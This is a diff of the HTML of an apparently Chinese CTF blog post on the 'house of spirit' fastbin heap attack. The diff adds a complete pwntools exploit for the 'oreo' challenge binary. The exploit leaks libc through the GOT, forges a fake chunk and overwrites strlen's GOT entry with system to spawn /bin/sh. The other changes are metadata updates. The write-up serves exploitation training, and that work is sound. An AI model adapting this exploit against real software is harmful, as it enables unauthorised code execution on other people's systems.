@@ -25,7 +25,7 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://ts1.cn.mm.bing.net/th/id/R-C.6f24c717cbea681c7ff9a3775200fc3a?rik=Z5k42qGtBb5Ydw&riu=http%3a%2f%2farsenetang.com%2fimages%2flogo.jpg&ehk=oYmEy9T4nBZNWyNJ9qICb9a2tqRmr57tD0%2bdsw6dWFo%3d&risl=&pid=ImgRaw&r=0">
 <meta property="article:published_time" content="2023-12-22T07:38:50.000Z">
-<meta property="article:modified_time" content="2024-03-05T12:57:26.527Z">
+<meta property="article:modified_time" content="2024-03-05T13:29:01.247Z">
 <meta property="article:author" content="OSLike">
 <meta property="article:tag" content="knowledge">
 <meta property="article:tag" content="pwn">
@@ -257,7 +257,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          3.2k 字
+          4.3k 字
         
       </span>
     
@@ -268,7 +268,7 @@
         
         
         
-          24 分钟
+          32 分钟
         
       </span>
     
@@ -371,6 +371,11 @@
 <li>show函数的任意读可以帮助我们泄露出libc_base，那么首先头部add一个，让next指向任意一个got表函数地址，然后通过show输出就可以得到libc_base了；</li>
 <li>这时的目的是延长到notice的位置，然后通过修改notice-&gt;next指向某一个可以控制的函数即可。</li>
 </ol>
+<p>exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>io = process(<span class="hljs-string">&#x27;./oreo&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./oreo&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">duan</span>():<br>	gdb.attach(io)<br>	pause()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">s1, s2</span>):<br>	io.sendline(<span class="hljs-string">b&#x27;1&#x27;</span>)<br>	io.sendline(s2)<br>	io.sendline(s1)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>():<br>	io.sendline(<span class="hljs-string">b&#x27;2&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>():<br>	io.sendline(<span class="hljs-string">b&#x27;3&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">s</span>):<br>	io.sendline(<span class="hljs-string">b&#x27;4&#x27;</span>)<br>	io.sendline(s)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>	add(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">27</span>+p32(elf.got.puts), <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">25</span>)<br>	show()<br>	io.recvuntil(<span class="hljs-string">b&#x27;Description: &#x27;</span>)<br>	io.recvuntil(<span class="hljs-string">b&#x27;Description: &#x27;</span>)<br>	puts = u32(io.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>, drop=<span class="hljs-literal">True</span>)[:<span class="hljs-number">4</span>])<br>	log.success(<span class="hljs-built_in">hex</span>(puts))<br>	base = puts - libc.sym.puts<br>	log.success(<span class="hljs-built_in">hex</span>(base))<br>	sys = base + libc.sym.system<br>	bsh = base + libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>).__next__()<br>	<span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x3f</span>):<br>		add(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">27</span>+p32(<span class="hljs-number">0</span>),<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">25</span>)<br>	add(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">27</span>+p32(<span class="hljs-number">0x804a2a8</span>), <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">25</span>)<br>	edit(<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x20</span>+p32(<span class="hljs-number">0x40</span>)+p32(<span class="hljs-number">0x50</span>))<br>	free()<br>	add(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">20</span>, p32(elf.got.strlen).ljust(<span class="hljs-number">20</span>, <span class="hljs-string">b&#x27;a&#x27;</span>))<br>	edit(p32(sys)+<span class="hljs-string">b&quot;;/bin/sh\x00&quot;</span>)<br><br>main()<br>io.interactive()<br></code></pre></td></tr></table></figure>
+
+
+
 <h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>house of spirit是一种fastbin attack，利用free将伪造的fake chunk释放，fake chunk的地址会被放在fastbin链中，实现对任意地址写。</p>
 <p>影响版本：2.23至今，所有含有fastbin的版本。</p>
 <p>fake chunk有如下检查：</p>
